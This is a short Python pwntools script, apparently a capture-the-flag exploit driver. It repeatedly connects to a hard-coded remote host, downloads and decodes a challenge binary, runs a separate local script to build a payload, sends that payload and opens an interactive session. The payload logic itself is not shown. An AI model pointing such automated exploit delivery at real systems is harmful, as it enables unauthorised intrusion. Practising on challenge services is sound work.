#!/usr/bin/python -i

from pwn import *

context.arch = 'amd64'

Local = False#True

if Local:
    host = '127.0.0.1'
    port = 2323
else:
    import sys
    default_host = '49.4.66.242'
    host = sys.argv[1] if len(sys.argv) > 1 else default_host
    port = 30714

def download(filename):
    r = remote(host, port)
    r.recvuntil('wait...\n')

    s=r.recvline()

    with open(filename+'.bin','wb') as f:
        f.write(s)
    import os
    os.system('base64 -d '+filename+'.bin | gunzip > '+filename+'.elf')

    os.system('pypy ./script.py '+filename+'.elf')

    with open('payload') as f:
        pl=f.read()
    #pl = ''

    r.send(pl+'\n')
    #raw_input('continue ->')
    #pl = ''

    r.interactive()

for i in range(10):
    download(str(i))